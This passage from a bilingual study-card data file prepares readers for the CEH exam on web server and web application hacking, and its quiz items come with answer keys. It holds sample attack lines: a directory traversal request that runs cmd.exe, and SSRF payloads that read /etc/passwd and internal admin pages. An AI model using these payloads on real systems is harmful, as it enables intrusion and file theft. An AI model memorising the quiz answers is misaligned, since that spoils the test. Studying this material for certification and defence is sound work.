 n:13, exam:"312-50",
 t:{fr:"Hacking de serveurs web",en:"Hacking Web Servers"},
 sub:{fr:"Attaquer et durcir le serveur web",en:"Attacking and hardening the web server"},
 cards:[

  {id:"concepts", t:{fr:"Concepts",en:"Concepts"},
   s:{fr:"Composants, 7-stack, pourquoi compromis",en:"Components, 7-stack, why compromised"},
   blocks:[
    {t:"table",head:{fr:["Composant","Rôle"],en:["Component","Role"]},rows:[
      [{fr:"**Document root**",en:"**Document root**"},{fr:"répertoire des fichiers HTML du site",en:"directory of the site's HTML files"}],
      [{fr:"**Server root**",en:"**Server root**"},{fr:"répertoire racine du serveur : sous-dossiers **conf** (config), **logs**, **cgi-bin**",en:"server's top-level dir: **conf** (config), **logs**, **cgi-bin** subfolders"}]]},
    {t:"h",fr:"Les 7 niveaux de sécurité (7-stack)",en:"The 7 security levels (7-stack)"},
    {t:"p",fr:"De haut en bas : **7** Applications web custom (business logic) · **6** Composants tiers · **5** Serveur web (Apache/IIS) · **4** Base de données · **3** OS · **2** Réseau · **1** Sécurité (IDS/IPS). Comme les couches réseau/OS sont protégées par FW/IDS, l'attaquant se rabat sur les niveaux **serveur et application web** (exposés sur Internet).",en:"Top to bottom: **7** Custom web apps (business logic) · **6** Third-party components · **5** Web server (Apache/IIS) · **4** Database · **3** OS · **2** Network · **1** Security (IDS/IPS). Since network/OS layers are protected by FW/IDS, the attacker falls back on the **web-server and web-app** levels (Internet-exposed)."},
    {t:"h",fr:"Pourquoi un serveur est compromis",en:"Why a server gets compromised"},
    {t:"ul",items:[
      {fr:"Permissions fichiers/répertoires incorrectes, **réglages par défaut**, services inutiles activés",en:"Wrong file/dir permissions, **default settings**, unnecessary services enabled"},
      {fr:"Comptes par défaut sans mot de passe, fichiers d'exemple/backup, certificats SSL auto-signés",en:"Default accounts with no password, sample/backup files, self-signed SSL certs"},
      {fr:"Misconfigurations serveur/OS/réseau, fonctions d'admin/debug accessibles",en:"Server/OS/network misconfigurations, accessible admin/debug functions"}]},
    {t:"recap",items:[
      {k:"Composants",fr:"document root (HTML) / server root (conf,logs,cgi-bin)",en:"document root (HTML) / server root (conf,logs,cgi-bin)"},
      {k:"7-stack",fr:"7 app custom … 1 sécurité",en:"7 custom app … 1 security"},
      {k:"Faiblesses",fr:"défauts, services inutiles, certs auto-signés",en:"defaults, unnecessary services, self-signed certs"}]}
   ]},

  {id:"attacks", t:{fr:"Attaques serveur web",en:"Web server attacks"},
   s:{fr:"Directory traversal, DNS hijack, cache poisoning",en:"Directory traversal, DNS hijack, cache poisoning"},
   blocks:[
    {t:"table",head:{fr:["Attaque","Principe"],en:["Attack","Principle"]},rows:[
      [{fr:"**Directory traversal**",en:"**Directory traversal**"},{fr:"séquence **`../`** (dot-dot-slash) pour sortir du root et accéder à des fichiers restreints",en:"**`../`** (dot-dot-slash) sequence to escape the root and reach restricted files"}],
      [{fr:"**DNS server hijacking**",en:"**DNS server hijacking**"},{fr:"compromettre le serveur DNS → rediriger vers un faux site",en:"compromise the DNS server → redirect to a fake site"}],
      [{fr:"**DNS amplification**",en:"**DNS amplification**"},{fr:"requêtes récursives avec IP victime usurpée → réponses amplifiées (DDoS)",en:"recursive queries with spoofed victim IP → amplified responses (DDoS)"}],
      [{fr:"**HTTP response splitting**",en:"**HTTP response splitting**"},{fr:"injection CRLF → le serveur produit **2 réponses** (1 à l'attaquant, 1 à la victime)",en:"CRLF injection → the server produces **2 responses** (1 to attacker, 1 to victim)"}],
      [{fr:"**Web cache poisoning**",en:"**Web cache poisoning**"},{fr:"vider le cache puis y stocker une réponse forgée",en:"flush the cache then store a forged response in it"}],
      [{fr:"**Misconfiguration**",en:"**Misconfiguration**"},{fr:"erreurs verbeuses, directory browsing, server-status exposé",en:"verbose errors, directory browsing, exposed server-status"}]]},
    {t:"cmd",lbl:"Directory traversal",lines:[
      ["GET /scripts/..%5c../Windows/System32/cmd.exe?/c+dir","{fr:remonte hors du root (encodé)|en:climbs out of the root (encoded)}"]]},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**Directory traversal = `../`**. **HTTP response splitting** repose sur une injection CRLF et génère **2 réponses**. **DNS hijacking** modifie le mapping DNS ; **DNS amplification** fait du DDoS via des requêtes récursives usurpées.",en:"**Directory traversal = `../`**. **HTTP response splitting** relies on CRLF injection and generates **2 responses**. **DNS hijacking** alters DNS mapping; **DNS amplification** does DDoS via spoofed recursive queries."},
    {t:"recap",items:[
      {k:"Traversal",fr:"`../` pour sortir du root",en:"`../` to escape the root"},
      {k:"Response splitting",fr:"CRLF → 2 réponses",en:"CRLF → 2 responses"},
      {k:"DNS",fr:"hijack (mapping) / amplification (DDoS)",en:"hijack (mapping) / amplification (DDoS)"}]}
   ]},

  {id:"method", t:{fr:"Méthodologie (6 étapes)",en:"Methodology (6 stages)"},
   s:{fr:"Info gathering → footprinting → passwords",en:"Info gathering → footprinting → passwords"},
   blocks:[
    {t:"ol",items:[
      {fr:"**Information gathering** (Whois, Domain Dossier)",en:"**Information gathering** (Whois, Domain Dossier)"},
      {fr:"**Web server footprinting** — bannières (`nc <ip> 80` + HEAD), **robots.txt** (révèle des chemins interdits)",en:"**Web server footprinting** — banners (`nc <ip> 80` + HEAD), **robots.txt** (reveals disallowed paths)"},
      {fr:"**Website mirroring** (copie hors-ligne, ex. httrack)",en:"**Website mirroring** (offline copy, e.g. httrack)"},
      {fr:"**Vulnerability scanning**",en:"**Vulnerability scanning**"},
      {fr:"**Session hijacking** (Burp Sequencer teste l'aléa des tokens)",en:"**Session hijacking** (Burp Sequencer tests token randomness)"},
      {fr:"**Web server passwords hacking** (brute-force ; défauts via **cirt.net**)",en:"**Web server passwords hacking** (brute-force; defaults via **cirt.net**)"}]},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**robots.txt** peut révéler la structure des répertoires. **cirt.net** = base de mots de passe/comptes par défaut. **Burp Suite (Sequencer)** teste l'aléatoire des session tokens.",en:"**robots.txt** can reveal directory structure. **cirt.net** = default password/account database. **Burp Suite (Sequencer)** tests session-token randomness."},
    {t:"recap",items:[
      {k:"6 étapes",fr:"info → footprinting → mirroring → vuln → session → passwords",en:"info → footprinting → mirroring → vuln → session → passwords"},
      {k:"robots.txt",fr:"chemins interdits révélés",en:"disclosed disallowed paths"},
      {k:"Défauts",fr:"cirt.net",en:"cirt.net"}]}
   ]},

  {id:"defense", t:{fr:"Contre-mesures",en:"Countermeasures"},
   s:{fr:"DMZ 3 segments, HSTS, WAF, DNSSEC",en:"3-segment DMZ, HSTS, WAF, DNSSEC"},
   blocks:[
    {t:"p",fr:"**Architecture recommandée en 3 segments** : Internet → pare-feu externe → **DMZ** (serveur web/FTP/mail) → pare-feu interne → réseau interne (base de données, serveur d'application). La **base de données va sur un serveur séparé**.",en:"**Recommended 3-segment architecture**: Internet → external firewall → **DMZ** (web/FTP/mail server) → internal firewall → internal network (database, app server). The **database goes on a separate server**."},
    {t:"ul",items:[
      {fr:"Limiter le trafic entrant aux **ports 80 (HTTP) et 443 (HTTPS)**",en:"Limit inbound traffic to **ports 80 (HTTP) and 443 (HTTPS)**"},
      {fr:"Rediriger tout HTTP vers HTTPS, **HSTS** (empêche le downgrade), certificats renouvelés automatiquement",en:"Redirect all HTTP to HTTPS, **HSTS** (prevents downgrade), auto-renewed certificates"},
      {fr:"**WAF** contre SQLi/XSS, **SFTP** au lieu de FTP, config (.htaccess/web.config) non accessible depuis le web",en:"**WAF** against SQLi/XSS, **SFTP** instead of FTP, config (.htaccess/web.config) not web-accessible"},
      {fr:"Ne jamais installer IIS sur un DC ; durcir avant toute mise en ligne ; désactiver directory browsing et erreurs verbeuses",en:"Never install IIS on a DC; harden before going live; disable directory browsing and verbose errors"},
      {fr:"Contre le DNS hijacking : **registrar-lock**, **DNSSEC**, restreindre les zone transfers",en:"Against DNS hijacking: **registrar-lock**, **DNSSEC**, restrict zone transfers"}]},
    {t:"recap",items:[
      {k:"Segmentation",fr:"Internet · DMZ · réseau interne (DB séparée)",en:"Internet · DMZ · internal network (separate DB)"},
      {k:"Ports",fr:"80 / 443 uniquement en entrée",en:"80 / 443 inbound only"},
      {k:"TLS",fr:"HTTPS partout + HSTS",en:"HTTPS everywhere + HSTS"},
      {k:"DNS",fr:"registrar-lock, DNSSEC",en:"registrar-lock, DNSSEC"}]}
   ]}
 ],

  {q:{fr:"Quelle séquence les attaquants utilisent-ils dans une attaque de directory traversal ?",en:"Which sequence do attackers use in a directory traversal attack?"},opts:[{fr:"../ (dot-dot-slash)",en:"../ (dot-dot-slash)"},{fr:"&& (double ampersand)",en:"&& (double ampersand)"},{fr:"%00 (null byte)",en:"%00 (null byte)"},{fr:"|| (double pipe)",en:"|| (double pipe)"}],a:0,ex:{fr:"La séquence ../ remonte l'arborescence pour sortir du répertoire racine et accéder à des fichiers restreints.",en:"The ../ sequence climbs the tree to escape the root directory and reach restricted files."}},
  {q:{fr:"Combien de réponses le serveur génère-t-il lors d'une attaque HTTP response splitting ?",en:"How many responses does the server generate in an HTTP response splitting attack?"},opts:[{fr:"deux (une à l'attaquant, une à la victime)",en:"two (one to the attacker, one to the victim)"},{fr:"une",en:"one"},{fr:"trois",en:"three"},{fr:"aucune",en:"none"}],a:0,ex:{fr:"L'injection CRLF scinde la réponse en deux : la première va à l'attaquant, la seconde à la victime.",en:"CRLF injection splits the response into two: the first goes to the attacker, the second to the victim."}},

  {q:{fr:"Quel en-tête HTTP force les connexions sécurisées et empêche les attaques de downgrade ?",en:"Which HTTP header forces secure connections and prevents downgrade attacks?"},opts:[{fr:"HSTS",en:"HSTS"},{fr:"X-Frame-Options",en:"X-Frame-Options"},{fr:"Content-Type",en:"Content-Type"},{fr:"Referer",en:"Referer"}],a:0,ex:{fr:"HSTS (HTTP Strict Transport Security) force le navigateur à utiliser HTTPS, contrant les attaques de downgrade (ex. sslstrip).",en:"HSTS (HTTP Strict Transport Security) forces the browser to use HTTPS, countering downgrade attacks (e.g. sslstrip)."}},
  {q:{fr:"Quelle base fournit les mots de passe/comptes par défaut des interfaces d'admin ?",en:"Which database provides default passwords/accounts for admin interfaces?"},opts:[{fr:"cirt.net",en:"cirt.net"},{fr:"cve.mitre.org",en:"cve.mitre.org"},{fr:"shodan.io",en:"shodan.io"},{fr:"virustotal.com",en:"virustotal.com"}],a:0,ex:{fr:"cirt.net recense les identifiants/ports par défaut des équipements — utile pour le password cracking d'un serveur web.",en:"cirt.net lists default credentials/ports for devices — useful for web-server password cracking."}},
  {q:{fr:"Que peut révéler l'analyse du fichier robots.txt ?",en:"What can analyzing the robots.txt file reveal?"},opts:[{fr:"des chemins/répertoires interdits que l'on ne verrait pas normalement",en:"disallowed paths/directories not normally visible"},{fr:"les mots de passe des utilisateurs",en:"user passwords"},{fr:"la version du noyau",en:"the kernel version"},{fr:"les clés TLS privées",en:"the private TLS keys"}],a:0,ex:{fr:"robots.txt liste des chemins « Disallow » qui trahissent parfois la structure des répertoires que l'attaquant n'était pas censé voir.",en:"robots.txt lists \"Disallow\" paths that can betray directory structure the attacker wasn't meant to see."}},

 n:14, exam:"312-50",
 t:{fr:"Hacking d'applications web",en:"Hacking Web Applications"},
 sub:{fr:"OWASP, méthodologie, API",en:"OWASP, methodology, API"},
 cards:[

  {id:"owasp", t:{fr:"Concepts & OWASP Top 10",en:"Concepts & OWASP Top 10"},
   s:{fr:"Architecture 3 couches, Top 10 2021, SSRF",en:"3-layer architecture, Top 10 2021, SSRF"},
   blocks:[
    {t:"p",fr:"Une application web s'articule en **3 couches** : **présentation/client**, **logique métier** (serveur web + logique applicative .NET/Java), **base de données**. Fichiers statiques (.html) servis directement ; dynamiques (.php/.asp) traités par le serveur d'application.",en:"A web application has **3 layers**: **presentation/client**, **business logic** (web server + .NET/Java app logic), **database**. Static files (.html) served directly; dynamic ones (.php/.asp) processed by the app server."},
    {t:"h",fr:"OWASP Top 10 (2021)",en:"OWASP Top 10 (2021)"},
    {t:"table",head:{fr:["#","Risque"],en:["#","Risk"]},rows:[
      [{fr:"**A01**",en:"**A01**"},{fr:"Broken Access Control",en:"Broken Access Control"}],
      [{fr:"**A02**",en:"**A02**"},{fr:"Cryptographic Failures",en:"Cryptographic Failures"}],
      [{fr:"**A03**",en:"**A03**"},{fr:"Injection (SQLi, command, LDAP, **XSS**)",en:"Injection (SQLi, command, LDAP, **XSS**)"}],
      [{fr:"**A04**",en:"**A04**"},{fr:"Insecure Design",en:"Insecure Design"}],
      [{fr:"**A05**",en:"**A05**"},{fr:"Security Misconfiguration (XXE)",en:"Security Misconfiguration (XXE)"}],
      [{fr:"**A06**",en:"**A06**"},{fr:"Vulnerable and Outdated Components",en:"Vulnerable and Outdated Components"}],
      [{fr:"**A07**",en:"**A07**"},{fr:"Identification and Authentication Failures",en:"Identification and Authentication Failures"}],
      [{fr:"**A08**",en:"**A08**"},{fr:"Software and Data Integrity Failures (désérialisation)",en:"Software and Data Integrity Failures (deserialization)"}],
      [{fr:"**A09**",en:"**A09**"},{fr:"Security Logging and Monitoring Failures",en:"Security Logging and Monitoring Failures"}],
      [{fr:"**A10**",en:"**A10**"},{fr:"Server-Side Request Forgery (**SSRF**)",en:"Server-Side Request Forgery (**SSRF**)"}]]},
    {t:"cmd",lbl:"SSRF (A10)",lines:[
      ["?url=http://127.0.0.1/admin","{fr:accès à des pages internes|en:access internal pages}"],
      ["?url=file:///etc/passwd","{fr:lecture de fichiers locaux|en:read local files}"]]},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**A03 = Injection** (couvre SQLi, command, LDAP, **XSS**). **A01 = Broken Access Control** (n°1). **A10 = SSRF**. XXE tombe sous **A05** (Security Misconfiguration).",en:"**A03 = Injection** (covers SQLi, command, LDAP, **XSS**). **A01 = Broken Access Control** (#1). **A10 = SSRF**. XXE falls under **A05** (Security Misconfiguration)."},
    {t:"recap",items:[
      {k:"Architecture",fr:"présentation · logique métier · base de données",en:"presentation · business logic · database"},
      {k:"A01 / A03 / A10",fr:"Access Control / Injection / SSRF",en:"Access Control / Injection / SSRF"},
      {k:"XSS",fr:"dans A03 (Injection)",en:"under A03 (Injection)"},
      {k:"SSRF",fr:"force l'appli à requêter une cible interne",en:"forces the app to request an internal target"}]}
   ]},

  {id:"threats", t:{fr:"Menaces web",en:"Web threats"},
   s:{fr:"XSS, CRLF, clickjacking, désérialisation",en:"XSS, CRLF, clickjacking, deserialization"},
   blocks:[
    {t:"table",head:{fr:["Attaque","Principe"],en:["Attack","Principle"]},rows:[
      [{fr:"**XSS**",en:"**XSS**"},{fr:"injecte des scripts client (JS) dans des pages vues par d'autres → vol de cookies, hijack",en:"injects client-side scripts (JS) into pages seen by others → cookie theft, hijack"}],
      [{fr:"**CRLF injection**",en:"**CRLF injection**"},{fr:"injecte `\\r\\n` (%0d%0a) → falsifie les logs, HTTP response splitting/smuggling",en:"injects `\\r\\n` (%0d%0a) → forges logs, HTTP response splitting/smuggling"}],
      [{fr:"**Same-site attack**",en:"**Same-site attack**"},{fr:"détourne un **sous-domaine** mal configuré partageant le TLD de confiance",en:"hijacks a misconfigured **subdomain** sharing the trusted TLD"}],
      [{fr:"**Insecure deserialization**",en:"**Insecure deserialization**"},{fr:"injecte du code dans les données sérialisées → exécuté à la désérialisation",en:"injects code into serialized data → executed on deserialization"}],
      [{fr:"**Clickjacking**",en:"**Clickjacking**"},{fr:"UI redress : iframe 1×1 caché, click event dropping, rapid content replacement",en:"UI redress: hidden 1×1 iframe, click event dropping, rapid content replacement"}],
      [{fr:"**Watering hole**",en:"**Watering hole**"},{fr:"piège un site fréquenté par la cible",en:"traps a site frequented by the target"}],
      [{fr:"**H2C smuggling**",en:"**H2C smuggling**"},{fr:"HTTP/2 over TCP (sans TLS) → request smuggling, cache poisoning",en:"HTTP/2 over TCP (no TLS) → request smuggling, cache poisoning"}],
      [{fr:"**JSON / WebSocket hijacking**",en:"**JSON / WebSocket hijacking**"},{fr:"exploite la same-origin policy / un handshake WebSocket sans token CSRF",en:"exploits same-origin policy / a WebSocket handshake without a CSRF token"}]]},
    {t:"p",fr:"**Timing attacks** (3 types) : **direct** (temps de traitement d'un POST → devine un user), **cross-site**, **browser-based** (side-channel).",en:"**Timing attacks** (3 types): **direct** (POST processing time → guess a user), **cross-site**, **browser-based** (side-channel)."},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**XSS** = scripts client injectés. **CRLF** = `%0d%0a` (falsification de logs, response splitting). **Same-site** = sous-domaine sur le TLD de confiance. **Clickjacking** = UI redress (iframe caché).",en:"**XSS** = injected client-side scripts. **CRLF** = `%0d%0a` (log forgery, response splitting). **Same-site** = subdomain on the trusted TLD. **Clickjacking** = UI redress (hidden iframe)."},
    {t:"recap",items:[
      {k:"XSS",fr:"scripts client → vol de cookies",en:"client scripts → cookie theft"},
      {k:"CRLF",fr:"%0d%0a → logs/response splitting",en:"%0d%0a → logs/response splitting"},
      {k:"Clickjacking",fr:"UI redress (iframe caché)",en:"UI redress (hidden iframe)"},
      {k:"Désérialisation",fr:"code dans les données sérialisées",en:"code in serialized data"}]}
   ]},

  {id:"method", t:{fr:"Méthodologie (12 phases)",en:"Methodology (12 phases)"},
   s:{fr:"Footprint → auth → authz → injection → logique",en:"Footprint → auth → authz → injection → logic"},
   blocks:[
    {t:"ol",items:[
      {fr:"Footprint web infrastructure ; **2.** Analyze web applications",en:"Footprint web infrastructure; **2.** Analyze web applications"},
      {fr:"Bypass client-side controls ; **4.** Attack authentication",en:"Bypass client-side controls; **4.** Attack authentication"},
      {fr:"Attack authorization ; **6.** Attack access controls",en:"Attack authorization; **6.** Attack access controls"},
      {fr:"Attack session management ; **8.** Injection attacks",en:"Attack session management; **8.** Injection attacks"},
      {fr:"Attack application logic flaws ; **10.** Attack shared environments",en:"Attack application logic flaws; **10.** Attack shared environments"},
      {fr:"Attack database connectivity ; **12.** Attack web clients (+ web services)",en:"Attack database connectivity; **12.** Attack web clients (+ web services)"}]},
    {t:"h",fr:"Analyse & reconnaissance",en:"Analysis & recon"},
    {t:"cmd",lbl:"Outils d'analyse web",lines:[
      ["wafw00f cible.com","{fr:détecte un WAF|en:detect a WAF}"],
      ["gobuster dir -u https://cible -w common.txt","{fr:énumère répertoires/fichiers|en:enumerate dirs/files}"],
      ["httrack https://cible -O ./mirror","{fr:miroir hors-ligne|en:offline mirror}"]]},
    {t:"p",fr:"Fingerprint de stack : **Wappalyzer, BuiltWith**. Extensions de fichiers (.php/.asp/.jsp) → plateforme de script.",en:"Stack fingerprinting: **Wappalyzer, BuiltWith**. File extensions (.php/.asp/.jsp) → scripting platform."},
    {t:"h",fr:"Authentification & autorisation",en:"Authentication & authorization"},
    {t:"ul",items:[
      {fr:"**Auth** : 14 failles (bad passwords, verbose failure messages, insecure transmission, **password reset poisoning** via en-tête Host, « remember me »…)",en:"**Auth**: 14 flaws (bad passwords, verbose failure messages, insecure transmission, **password reset poisoning** via Host header, \"remember me\"…)"},
      {fr:"**Authz** : 6 techniques — URI, POST data, query string & cookies, **parameter tampering** (ex. `Admin=false→true`), HTTP headers, hidden tags",en:"**Authz**: 6 techniques — URI, POST data, query string & cookies, **parameter tampering** (e.g. `Admin=false→true`), HTTP headers, hidden tags"}]},
    {t:"h",fr:"Logique & base de données",en:"Logic & database"},
    {t:"p",fr:"**Logic flaws** : sauter une étape (ex. « proceed to pay ») = **forced browsing** (via Burp). **Database connectivity** : 3 types — **connection string injection** (paramètres ajoutés avec `;`), CSPP, connection pool DoS. **Web services** : SOAP injection, SOAPAction spoofing.",en:"**Logic flaws**: skipping a step (e.g. \"proceed to pay\") = **forced browsing** (via Burp). **Database connectivity**: 3 types — **connection string injection** (params appended with `;`), CSPP, connection pool DoS. **Web services**: SOAP injection, SOAPAction spoofing."},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**WAFW00F** détecte un WAF, **gobuster** énumère répertoires/fichiers, **httrack** fait le miroir. **Parameter tampering** = modifier une valeur (Admin=false→true). **Forced browsing** = sauter une étape logique. Connection string injection utilise le **`;`**.",en:"**WAFW00F** detects a WAF, **gobuster** enumerates dirs/files, **httrack** mirrors. **Parameter tampering** = change a value (Admin=false→true). **Forced browsing** = skip a logic step. Connection string injection uses the **`;`**."},
    {t:"recap",items:[
      {k:"Analyse",fr:"Wappalyzer, gobuster, WAFW00F, httrack",en:"Wappalyzer, gobuster, WAFW00F, httrack"},
      {k:"Authz",fr:"6 techniques dont parameter tampering",en:"6 techniques incl. parameter tampering"},
      {k:"Logic",fr:"forced browsing (sauter une étape)",en:"forced browsing (skip a step)"},
      {k:"DB",fr:"connection string injection (;)",en:"connection string injection (;)"}]}
   ]},

  {id:"api", t:{fr:"API & webhooks",en:"API & webhooks"},
   s:{fr:"OWASP API Top 10, IDOR, credential stuffing",en:"OWASP API Top 10, IDOR, credential stuffing"},
   blocks:[
    {t:"p",fr:"Une **API REST** est stateless, cacheable, à interface uniforme. **XML-RPC / JSON-RPC** transfèrent des données (JSON plus léger que SOAP).",en:"A **REST API** is stateless, cacheable, with a uniform interface. **XML-RPC / JSON-RPC** transfer data (JSON lighter than SOAP)."},
    {t:"h",fr:"OWASP API Top 10",en:"OWASP API Top 10"},
    {t:"table",head:{fr:["API","Risque"],en:["API","Risk"]},rows:[
      [{fr:"**API1**",en:"**API1**"},{fr:"Broken Object-Level Authorization (**BOLA / IDOR**)",en:"Broken Object-Level Authorization (**BOLA / IDOR**)"}],
      [{fr:"**API2**",en:"**API2**"},{fr:"Broken Authentication",en:"Broken Authentication"}],
      [{fr:"**API3**",en:"**API3**"},{fr:"Broken Object Property Level Authorization",en:"Broken Object Property Level Authorization"}],
      [{fr:"**API4**",en:"**API4**"},{fr:"Unrestricted Resource Consumption",en:"Unrestricted Resource Consumption"}],
      [{fr:"**API5**",en:"**API5**"},{fr:"Broken Function Level Authorization",en:"Broken Function Level Authorization"}],
      [{fr:"**API6**",en:"**API6**"},{fr:"Unrestricted Access to Sensitive Business Flows",en:"Unrestricted Access to Sensitive Business Flows"}],
      [{fr:"**API7**",en:"**API7**"},{fr:"Server-Side Request Forgery (SSRF)",en:"Server-Side Request Forgery (SSRF)"}],
      [{fr:"**API8**",en:"**API8**"},{fr:"Security Misconfiguration",en:"Security Misconfiguration"}],
      [{fr:"**API9**",en:"**API9**"},{fr:"Improper Inventory Management",en:"Improper Inventory Management"}],
      [{fr:"**API10**",en:"**API10**"},{fr:"Unsafe Consumption of APIs",en:"Unsafe Consumption of APIs"}]]},
    {t:"p",fr:"**IDOR** (Insecure Direct Object References) : référence directe à un objet passée en argument sans vérifier les droits. **Credential stuffing** : réutiliser des paires identifiant/mot de passe déjà fuitées (outils **Sentry MBA**, PhantomJS) — pas du brute-force.",en:"**IDOR** (Insecure Direct Object References): a direct object reference passed as an argument without checking rights. **Credential stuffing**: reuse already-leaked login/password pairs (tools **Sentry MBA**, PhantomJS) — not brute-force."},
    {t:"h",fr:"Webhooks",en:"Webhooks"},
    {t:"p",fr:"Un **webhook** est un callback HTTP (POST) déclenché par un événement — souvent appelé **« reverse API »** : automatisé, du site vers le serveur, en temps réel (vs l'API qui fait du pull).",en:"A **webhook** is an HTTP callback (POST) triggered by an event — often called a **\"reverse API\"**: automated, from site to server, in real time (vs the API which pulls)."},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**API1 = BOLA / IDOR** (manipuler un identifiant d'objet). **Credential stuffing** ≠ brute-force : on rejoue des credentials fuités (Sentry MBA). **Webhook** = reverse API (push, POST sur événement).",en:"**API1 = BOLA / IDOR** (manipulate an object ID). **Credential stuffing** ≠ brute-force: replaying leaked credentials (Sentry MBA). **Webhook** = reverse API (push, POST on event)."},
    {t:"recap",items:[
      {k:"API1",fr:"BOLA / IDOR",en:"BOLA / IDOR"},
      {k:"IDOR",fr:"réf. d'objet sans contrôle de droits",en:"object ref without rights check"},
      {k:"Credential stuffing",fr:"rejeu de credentials fuités (Sentry MBA)",en:"replay of leaked credentials (Sentry MBA)"},
      {k:"Webhook",fr:"reverse API (push POST)",en:"reverse API (push POST)"}]}
   ]},

  {id:"defense", t:{fr:"Sécurité & défense",en:"Security & defense"},
   s:{fr:"Fuzzing, SAST/DAST, encodage, contre-mesures",en:"Fuzzing, SAST/DAST, encoding, countermeasures"},
   blocks:[
    {t:"p",fr:"**Fuzzing** (test boîte noire) : envoyer des masses de données aléatoires pour révéler des failles (outil **wfuzz**). **SAST** analyse le code **sans l'exécuter** ; **DAST** teste l'application **en cours d'exécution**.",en:"**Fuzzing** (black-box test): send masses of random data to reveal flaws (tool **wfuzz**). **SAST** analyzes code **without running it**; **DAST** tests the **running** application."},
    {t:"h",fr:"Schémas d'encodage",en:"Encoding schemes"},
    {t:"table",head:{fr:["Schéma","Exemple"],en:["Scheme","Example"]},rows:[
      [{fr:"URL",en:"URL"},{fr:"`%3d`==\"=\", `%0a`=saut de ligne, `%20`=espace",en:"`%3d`==\"=\", `%0a`=newline, `%20`=space"}],
      [{fr:"HTML",en:"HTML"},{fr:"`&lt;`=<, `&gt;`=>, `&amp;`=&",en:"`&lt;`=<, `&gt;`=>, `&amp;`=&"}],
      [{fr:"Base64",en:"Base64"},{fr:"binaire → ASCII imprimable",en:"binary → printable ASCII"}],
      [{fr:"Hex",en:"Hex"},{fr:"Hello → 48 65 6C 6C 6F",en:"Hello → 48 65 6C 6C 6F"}]]},
    {t:"h",fr:"Contre-mesures d'injection",en:"Injection countermeasures"},
    {t:"ul",items:[
      {fr:"**SQLi** : **requêtes paramétrées / prepared statements**, éviter le SQL dynamique, compte DB à privilèges faibles, WAF, désactiver `xp_cmdshell`",en:"**SQLi**: **parameterized queries / prepared statements**, avoid dynamic SQL, low-privilege DB account, WAF, disable `xp_cmdshell`"},
      {fr:"**XSS** : valider/encoder les entrées et sorties, **CSP** (Content Security Policy), flag **HttpOnly** sur les cookies, WAF",en:"**XSS**: validate/encode inputs and outputs, **CSP** (Content Security Policy), **HttpOnly** flag on cookies, WAF"},
      {fr:"**CRLF** : encoder les caractères CR/LF, ne pas mettre d'entrée utilisateur dans les en-têtes",en:"**CRLF**: encode CR/LF characters, don't put user input in headers"},
      {fr:"**XXE** : parser sécurisé, DTD désactivées, validation XSD",en:"**XXE**: secure parser, disabled DTDs, XSD validation"}]},
    {t:"h",fr:"Sécurité des API",en:"API security"},
    {t:"p",fr:"HTTPS/TLS, **rate-limiting** + quotas/throttling, **IP whitelisting**, **requêtes paramétrées**, **API gateway** + MFA (OAuth2, OpenID Connect), pagination pour éviter les payloads massifs.",en:"HTTPS/TLS, **rate-limiting** + quotas/throttling, **IP whitelisting**, **parameterized queries**, **API gateway** + MFA (OAuth2, OpenID Connect), pagination to avoid oversized payloads."},
    {t:"trap",k:{fr:"Piège d'examen",en:"Exam trap"},fr:"**SAST = sans exécution** (code) ; **DAST = à l'exécution** (appli qui tourne). Contre le SQLi : **requêtes paramétrées**. Contre le XSS : **CSP** + encodage + HttpOnly.",en:"**SAST = no execution** (code); **DAST = at runtime** (running app). Against SQLi: **parameterized queries**. Against XSS: **CSP** + encoding + HttpOnly."},
    {t:"recap",items:[
      {k:"Fuzzing",fr:"données aléatoires (wfuzz)",en:"random data (wfuzz)"},
      {k:"SAST/DAST",fr:"code sans exec / appli en exec",en:"code without exec / running app"},
      {k:"SQLi",fr:"requêtes paramétrées",en:"parameterized queries"},
      {k:"XSS",fr:"CSP + encodage + HttpOnly",en:"CSP + encoding + HttpOnly"}]}
   ]}
 ],

 quiz:[
  {q:{fr:"Quel risque OWASP Top 10 (2021) couvre le SSRF ?",en:"Which OWASP Top 10 (2021) risk covers SSRF?"},opts:[{fr:"A10",en:"A10"},{fr:"A01",en:"A01"},{fr:"A03",en:"A03"},{fr:"A07",en:"A07"}],a:0,ex:{fr:"A10 = Server-Side Request Forgery. A01 = Broken Access Control, A03 = Injection.",en:"A10 = Server-Side Request Forgery. A01 = Broken Access Control, A03 = Injection."}},
  {q:{fr:"Quel risque OWASP couvre XSS, SQL Injection et Command Injection ?",en:"Which OWASP risk covers XSS, SQL Injection and Command Injection?"},opts:[{fr:"A03 (Injection)",en:"A03 (Injection)"},{fr:"A01 (Broken Access Control)",en:"A01 (Broken Access Control)"},{fr:"A05 (Security Misconfiguration)",en:"A05 (Security Misconfiguration)"},{fr:"A02 (Cryptographic Failures)",en:"A02 (Cryptographic Failures)"}],a:0,ex:{fr:"Dans l'OWASP Top 10 2021, XSS est classé sous A03 – Injection (avec SQLi, command injection, LDAP injection).",en:"In OWASP Top 10 2021, XSS is classified under A03 – Injection (with SQLi, command injection, LDAP injection)."}},
  {q:{fr:"Que fait une attaque SSRF ?",en:"What does an SSRF attack do?"},opts:[{fr:"force l'application à envoyer une requête vers une destination interne inattendue",en:"forces the app to send a request to an unexpected internal destination"},{fr:"injecte du JavaScript dans la page",en:"injects JavaScript into the page"},{fr:"vole des cookies via le DOM",en:"steals cookies via the DOM"},{fr:"chiffre les fichiers du serveur",en:"encrypts the server's files"}],a:0,ex:{fr:"Le SSRF fait émettre par le serveur une requête forgée (ex. http://127.0.0.1/admin, file:///etc/passwd), contournant pare-feu/VPN.",en:"SSRF makes the server issue a forged request (e.g. http://127.0.0.1/admin, file:///etc/passwd), bypassing firewall/VPN."}},
